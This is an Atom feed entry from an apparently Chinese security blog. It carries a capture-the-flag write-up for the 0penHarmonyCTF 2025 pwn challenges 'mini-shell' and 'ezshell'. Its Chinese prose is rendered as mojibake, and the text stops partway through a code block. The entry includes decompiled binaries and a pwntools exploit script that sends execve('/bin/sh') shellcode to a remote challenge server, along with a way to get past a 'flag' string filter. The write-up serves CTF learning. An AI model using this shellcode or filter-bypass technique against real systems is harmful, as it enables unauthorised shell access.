<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ğŸ˜˜Thir0thçš„å–µå–µæ‚è´§é“º</title>
  
  
  <link href="https://www.thir0th.xyz/atom.xml" rel="self"/>
  
  <link href="https://www.thir0th.xyz/"/>
  <updated>2025-06-11T09:53:25.202Z</updated>
  <id>https://www.thir0th.xyz/</id>
  
  <author>
    <name>Thir0th</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>0penHarmonyCTF-pwn</title>
    <link href="https://www.thir0th.xyz/posts/906b7d18.html"/>
    <id>https://www.thir0th.xyz/posts/906b7d18.html</id>
    <published>2025-06-11T09:53:35.000Z</published>
    <updated>2025-06-11T09:53:25.202Z</updated>
    
    <content type="html"><![CDATA[<h1>2025 0penHarmonyCTF(éƒ¨åˆ†)</h1><h2 id="PWN">PWN</h2><h3 id="mini-shell">mini-shell</h3><p>ä¸€å¼€å§‹æ‹¿åˆ°æ˜¯æ¯”è¾ƒå”¬äººçš„ï¼Œæœ¬åœ°å¯åŠ¨ä¸€ä¸‹å°±å‘ç°ç¨‹åºä¸»è¿›ç¨‹å°±æ˜¯minishellè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸”å¯ä»¥ç”¨binwalkç›´æ¥åˆ†ç¦»å‡ºæ¥äºŒè¿›åˆ¶æ–‡ä»¶</p><p>catèƒ½æ‰§è¡Œshellcodeï¼Œä½†ä¼šå°†å¯„å­˜å™¨æ¸…ç©ºåŒ…æ‹¬rsp,rbpï¼Œè·Ÿ2025vnctfä¸€é“é¢˜ä¸€æ¨¡ä¸€æ ·äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // edx</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int v7; // edx</span><br><span class="line">  int v8; // ecx</span><br><span class="line">  int v9; // r8d</span><br><span class="line">  int v10; // r9d</span><br><span class="line">  char v12; // [rsp+0h] [rbp-20h]</span><br><span class="line">  _BYTE argva[10]; // [rsp+Eh] [rbp-12h] BYREF</span><br><span class="line">  unsigned __int64 v14; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  init_0(argc, argv, envp);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf((unsigned int)&quot;minishell$ &quot;, (_DWORD)argv, v3, v4, v5, v6, v12);</span><br><span class="line">    if ( !fgets(argva, 10LL, stdin) )</span><br><span class="line">      break;</span><br><span class="line">    argva[j_strcspn_ifunc(argva, &quot;\n&quot;)] = 0;</span><br><span class="line">    argv = (const char **)&quot;exit&quot;;</span><br><span class="line">    if ( !(unsigned int)j_strncmp_ifunc(argva, &quot;exit&quot;, 4LL) )</span><br><span class="line">      break;</span><br><span class="line">    if ( argva[0] )</span><br><span class="line">    &#123;</span><br><span class="line">      argv = (const char **)&quot;ls&quot;;</span><br><span class="line">      if ( (unsigned int)j_strncmp_ifunc(argva, &quot;ls&quot;, 2LL) )</span><br><span class="line">      &#123;</span><br><span class="line">        argv = (const char **)&quot;clear&quot;;</span><br><span class="line">        if ( (unsigned int)j_strncmp_ifunc(argva, &quot;clear&quot;, 5LL) )</span><br><span class="line">        &#123;</span><br><span class="line">          argv = (const char **)&quot;whoami&quot;;</span><br><span class="line">          if ( (unsigned int)j_strncmp_ifunc(argva, &quot;whoami&quot;, 6LL) )</span><br><span class="line">          &#123;</span><br><span class="line">            argv = (const char **)&quot;pwd&quot;;</span><br><span class="line">            if ( (unsigned int)j_strncmp_ifunc(argva, &quot;pwd&quot;, 3LL) )</span><br><span class="line">            &#123;</span><br><span class="line">              argv = (const char **)&quot;cat&quot;;</span><br><span class="line">              if ( (unsigned int)j_strncmp_ifunc(argva, &quot;cat&quot;, 3LL) )</span><br><span class="line">              &#123;</span><br><span class="line">                argv = (const char **)argva;</span><br><span class="line">                printf((unsigned int)&quot;Command not supported: %s\n&quot;, (unsigned int)argva, v7, v8, v9, v10, v12);</span><br><span class="line">              &#125;</span><br><span class="line">              else</span><br><span class="line">              &#123;</span><br><span class="line">                cat();</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              pwd();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            whoami();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          clear();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        ls();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cat</p><p><img src="https://s2.loli.net/2025/06/11/iFo38PvuOMxYHTp.png" alt="image"></p><p>exec</p><p><img src="https://s2.loli.net/2025/06/11/Jw4BdhLEzPfnDKI.png" alt="image"></p><p>ä¸€å¼€å§‹æ˜¯ç”¨çš„mov rsp, fs:[0x300]ï¼Œå»æ¢å¤æ ˆç©ºé—´ï¼Œæ„é€ readå†è¯»å…¥shellcodeï¼Œæœ¬åœ°ç¡®å®æ˜¯é€šäº†ï¼Œè¿œç¨‹ä¸é€šï¼Œå°±å»æœäº†vnctfå½“æ—¶çš„é¢˜ï¼Œå‘ç°äº†è¿™ä¸ªå¾ˆçŸ­çš„shellcodeï¼Œæœ¬åœ°å’Œè¿œç¨‹éƒ½å¯ä»¥é€š</p><p><a href="https://z-bosh.github.io/2025/02/11/VNCTF-2025/">VNCTF-2025 | Bosh's Blog</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr(size):</span><br><span class="line">return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./minishell&#x27;)</span><br><span class="line">p=remote(&#x27;61.147.171.107&#x27;,42114)</span><br><span class="line">#p = process(&#x27;./minishell&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;minishell$&quot;)</span><br><span class="line">sl(b&#x27;cat&#x27;)</span><br><span class="line">pause()</span><br><span class="line">#sleep(0.5)</span><br><span class="line"></span><br><span class="line">shellcode=asm(&#x27;&#x27;&#x27;</span><br><span class="line">mov al,59</span><br><span class="line">add rdi,8</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;)+b&#x27;/bin/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">li(hex(len(shellcode)))</span><br><span class="line">sl(shellcode)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#sleep(0.5)</span><br><span class="line">pause()</span><br><span class="line">shell=b&#x27;\x90&#x27;*(0x60)+asm(shellcraft.sh())</span><br><span class="line">sl(shell)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>â€</p><h3 id="ezshellï¼ˆå¤ç°ï¼‰">ezshellï¼ˆå¤ç°ï¼‰</h3><p>è·Ÿç¬¬ä¸€é¢˜ä¸€æ ·ï¼Œå°†äºŒè¿›åˆ¶æ–‡ä»¶åˆ†ç¦»å‡ºæ¥ï¼Œé¦–å…ˆå®šä½åˆ°éšè—å‡½æ•°</p><p><img src="https://s2.loli.net/2025/06/11/c5al4odFxQsLWMy.png" alt="image"></p><p>æ£€æµ‹ç¬¬ä¸€éƒ¨åˆ†!devmodeï¼Œæ£€æµ‹åç»­å‚æ•°ï¼Œsub_40135fä¸­è§„å®šäº†å‚æ•°çš„è¾“å…¥æ ¼å¼</p><p><img src="https://s2.loli.net/2025/06/11/Mih5nBRESNgF47Q.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall sub_40135F(__int64 a1, int UMU)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // r8d</span><br><span class="line">  int v3; // r9d</span><br><span class="line">  int v4; // edx</span><br><span class="line">  int v5; // ecx</span><br><span class="line">  int v6; // r8d</span><br><span class="line">  int v7; // r9d</span><br><span class="line">  int i_1; // edx</span><br><span class="line">  int v9; // ebx</span><br><span class="line">  int i; // [rsp+14h] [rbp-2Ch]</span><br><span class="line">  _BYTE *v12; // [rsp+18h] [rbp-28h]</span><br><span class="line">  unsigned __int64 i_2; // [rsp+20h] [rbp-20h]</span><br><span class="line">  _QWORD *v14; // [rsp+28h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  i_2 = sub_40A140(a1);</span><br><span class="line">  if ( i_2 % 3 )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;Invalid argument!&quot;, UMU, i_2 % 3, i_2 % 3, v2, v3);</span><br><span class="line">  v14 = (_QWORD *)sub_405301(i_2 / 3 + 8);</span><br><span class="line">  if ( !v14 )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;Memory allocation failed!&quot;, UMU, v4, v5, v6, v7);</span><br><span class="line">  *v14 = i_2 / 3 + 8;</span><br><span class="line">  v12 = v14 + 1;</span><br><span class="line">  for ( i = 0; i &lt; i_2; i += 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    i_1 = i;</span><br><span class="line">    if ( *(_BYTE *)(i + a1) != 92</span><br><span class="line">      || !(unsigned int)sub_4012E3((unsigned int)*(char *)(i + 1LL + a1))</span><br><span class="line">      || !(unsigned int)sub_4012E3((unsigned int)*(char *)(i + 2LL + a1)) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4042DE((unsigned int)&quot;Invalid argument!&quot;, UMU, i_1, v5, v6, v7);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = 16 * sub_401312((unsigned int)*(char *)(i + 1LL + a1));</span><br><span class="line">    *v12++ = v9 + sub_401312((unsigned int)*(char *)(i + 2LL + a1));</span><br><span class="line">  &#125;</span><br><span class="line">  return v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥æ ¼å¼ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/61/  #aï¼ŒäºŒä½ascilç </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">\ad\51\57\51 æ‰“å¼€ Advanced features</span><br><span class="line">\ff å½“æ‰“å¼€ Advanced features åå°è¯•è¯»å– /flag</span><br><span class="line">\bc å½“æ‰“å¼€ Advanced features åå°è¯•è¯»å– `/proc/cpuinfo``</span><br><span class="line">\ea[string çš„ opcodeæ ¼å¼] å½“æ‰“å¼€ Advanced features åä¸ºå­—ç¬¦ä¸²åˆ›å»º shortcutï¼Œå¦‚ \ea\66\6c\61ï¼ŒåŒæ—¶ä»¥ $&#123;index&#125; çš„æ ¼å¼è°ƒç”¨</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>ffï¼Œbcéƒ½å¯ä»¥è¯»å–flag</p><p><img src="https://s2.loli.net/2025/06/11/oyO9GnJ61zaHqBd.png" alt="image"></p><p><img src="https://s2.loli.net/2025/06/11/EnmzthdoZiWP254.png" alt="image"></p><p>ä½†è¦æƒ³æ‰§è¡Œè¿™ä¸ªéœ€è¦æ»¡è¶³v12ä¸ä¸ºç©ºï¼Œå°±éœ€è¦åˆ©ç”¨ad</p><p><img src="https://s2.loli.net/2025/06/11/i8rohDxY6FsZnzX.png" alt="image"></p><p>â€</p><p>eaåŠŸèƒ½å°±æ¯”è¾ƒé‡è¦ï¼Œå°±æ˜¯åˆ›å»ºå¿«æ·æ–¹å¼ï¼Œåˆ©ç”¨shortcutå¯ä»¥åˆ›å»ºå‚æ•°</p><p><img src="https://s2.loli.net/2025/06/11/u23f8RAXqVWokjr.png" alt="image"></p><ul><li><strong>æ›´æ–° UMU</strong>ï¼šLODWORD(UMU) = n9 - 1ï¼Œè®°å½•åˆšæ·»åŠ çš„å¿«æ·æ–¹å¼ç´¢å¼•ã€‚</li><li><strong>æ‰“å°ä¿¡æ¯</strong>ï¼šsub_4073F6ï¼ˆå¯èƒ½æ˜¯ printfï¼‰è¾“å‡ºâ€œShortcut %d added: %s\nâ€ï¼Œæ˜¾ç¤ºç´¢å¼•ï¼ˆn9 - 1ï¼‰å’Œå†…å®¹ï¼ˆdstï¼‰ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_403F9E(__int64 dst)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // ecx</span><br><span class="line">  int v2; // r8d</span><br><span class="line">  int v3; // r9d</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int n9; // ebx</span><br><span class="line">  __int64 v8; // rax</span><br><span class="line">  int v9; // r8d</span><br><span class="line">  int v10; // r9d</span><br><span class="line">  __int64 v11; // rcx</span><br><span class="line">  __int64 v12; // rdx</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( sub_40A5A0(dst, &quot;$&#123;&quot;) || sub_409FD5(dst, &#x27;&#125;&#x27;) )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;Invalid shortcut: %s&quot;, dst, (unsigned int)&quot;Invalid shortcut: %s&quot;, v1, v2, v3);</span><br><span class="line">  if ( sub_40A5A0(dst, &quot;flag&quot;) )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;Invalid shortcut: %s&quot;, dst, (unsigned int)&quot;Invalid shortcut: %s&quot;, v4, v5, v6);</span><br><span class="line">  n9 = n9;</span><br><span class="line">  v8 = sub_4043D4(dst);</span><br><span class="line">  v11 = 8LL * n9;</span><br><span class="line">  *(_QWORD *)((char *)&amp;unk_4106C0 + v11) = v8;</span><br><span class="line">  v12 = 8LL * n9;</span><br><span class="line">  if ( !*(_QWORD *)((char *)&amp;unk_4106C0 + v12) )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;str_dup failed&quot;, (unsigned int)&quot;flag&quot;, v12, v11, v9, v10);</span><br><span class="line">  result = (unsigned int)++n9;</span><br><span class="line">  if ( n9 &gt; 9 )</span><br><span class="line">    n9 = 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€</p><p>sub_40127A ä¼šå°† psub_403703 èµ‹å€¼å› sub_403703 æ­¤æ—¶å°±å¯ä»¥åœ¨ç›´æ¥åœ¨ shell ä¸­è°ƒç”¨ cat äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_403703(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int v7; // ecx</span><br><span class="line">  int v8; // r8d</span><br><span class="line">  int v9; // r9d</span><br><span class="line">  int v10; // edx</span><br><span class="line">  int v11; // ecx</span><br><span class="line">  int v12; // r8d</span><br><span class="line">  int v13; // r9d</span><br><span class="line">  int v14; // ecx</span><br><span class="line">  int v15; // r8d</span><br><span class="line">  int v16; // r9d</span><br><span class="line">  int v17; // ecx</span><br><span class="line">  int v18; // r8d</span><br><span class="line">  int v19; // r9d</span><br><span class="line">  char n46; // [rsp+1Fh] [rbp-21h]</span><br><span class="line">  __int64 v21; // [rsp+28h] [rbp-18h]</span><br><span class="line">  char *filename; // [rsp+30h] [rbp-10h]</span><br><span class="line">  __int64 v23; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  result = sub_40A140(a1);</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = sub_4040E8(a1);</span><br><span class="line">    if ( !v21 )</span><br><span class="line">      sub_4042DE((unsigned int)&quot;path translation failed&quot;, a2, v3, v4, v5, v6);</span><br><span class="line">    if ( (unsigned int)sub_40497C(v21) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_405067(v21);</span><br><span class="line">      filename = (char *)sub_4048B7(v21);</span><br><span class="line">      if ( !filename )</span><br><span class="line">        sub_4042DE((unsigned int)&quot;path translation failed&quot;, a2, v10, v11, v12, v13);</span><br><span class="line">      if ( sub_40A5A0(a1, &quot;flag&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4073F6(</span><br><span class="line">          (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">          a1,</span><br><span class="line">          (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">          v14,</span><br><span class="line">          v15,</span><br><span class="line">          v16);</span><br><span class="line">        return sub_405067(filename);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = sub_406F83(filename);</span><br><span class="line">        if ( v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          while ( 1 )</span><br><span class="line">          &#123;</span><br><span class="line">            n46 = sub_406F44(v23, &quot;rb&quot;);</span><br><span class="line">            if ( n46 == -1 )</span><br><span class="line">              break;</span><br><span class="line">            if ( (unsigned int)(n46 - 32) &lt;= 0x5E || n46 == 10 || n46 == 13 )</span><br><span class="line">              sub_40755B((unsigned int)n46);</span><br><span class="line">            else</span><br><span class="line">              sub_40755B(46LL);</span><br><span class="line">          &#125;</span><br><span class="line">          sub_406CBC(v23);</span><br><span class="line">          return sub_405067(filename);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          sub_4073F6(</span><br><span class="line">            (unsigned int)&quot;cat: cannot open &#x27;%s&#x27; for reading\n&quot;,</span><br><span class="line">            a1,</span><br><span class="line">            (unsigned int)&quot;cat: cannot open &#x27;%s&#x27; for reading\n&quot;,</span><br><span class="line">            v17,</span><br><span class="line">            v18,</span><br><span class="line">            v19);</span><br><span class="line">          return sub_405067(filename);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      return sub_4073F6(</span><br><span class="line">               (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">               a1,</span><br><span class="line">               (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">               v7,</span><br><span class="line">               v8,</span><br><span class="line">               v9);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/06/11/TJkqK9CIQ5Zjnh4.png" alt="image"></p><p>å…ˆææƒï¼ˆä¸ªäººç†è§£ä¸ºææƒï¼‰ï¼Œç„¶ååˆ›å»ºå¥½å­—ç¬¦ä¸²çš„å¿«æ·æ–¹å¼ï¼Œç„¶åcatè°ƒç”¨ï¼Œä½†æ³¨æ„ï¼Œè¿™é‡Œå¯¹å¿«æ·æ–¹å¼æœ‰æ£€æµ‹ï¼Œä¸èƒ½æ˜¯flagå­—ç¬¦ä¸²ï¼Œä½†å¯ä»¥æ‹¼æ¥ç»•è¿‡<img src="https://s2.loli.net/2025/06/11/XKugL1xpeRGvo9h.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 